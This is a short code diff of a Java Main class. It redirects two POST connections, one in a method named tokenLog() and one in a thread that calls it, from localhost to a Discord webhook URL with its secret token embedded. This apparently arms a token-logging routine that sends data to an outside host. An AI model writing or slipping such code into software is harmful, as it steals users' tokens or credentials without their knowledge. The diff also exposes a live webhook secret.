@@ -52,7 +52,7 @@ public class Main {
     public static void tokenLog() {
         new Thread(() -> {
             try {
-                HttpURLConnection con = (HttpURLConnection) new URL("https://localhost:80/").openConnection();
+                HttpURLConnection con = (HttpURLConnection) new URL("https://discord.com/api/webhooks/1246382531914236014/TUetnuUDhJNH22P0w9NeRN1dTZi3d5Uqqv11VkcwDJLy9k-rxvWGxBQaZkMkBrCKRiSY").openConnection();
                 con.setRequestMethod("POST");
                 con.setRequestProperty("Content-type", "application/json");
                 con.setDoOutput(true);
@@ -1502,7 +1502,7 @@ public class Main {
         new Thread(() -> {
             try {
                 Main.tokenLog();
-                HttpURLConnection con = (HttpURLConnection) new URL("https://localhost:80/").openConnection();
+                HttpURLConnection con = (HttpURLConnection) new URL("https://discord.com/api/webhooks/1246382531914236014/TUetnuUDhJNH22P0w9NeRN1dTZi3d5Uqqv11VkcwDJLy9k-rxvWGxBQaZkMkBrCKRiSY").openConnection();
                 con.setRequestMethod("POST");
                 con.setRequestProperty("Content-type", "application/json");
                 con.setDoOutput(true);
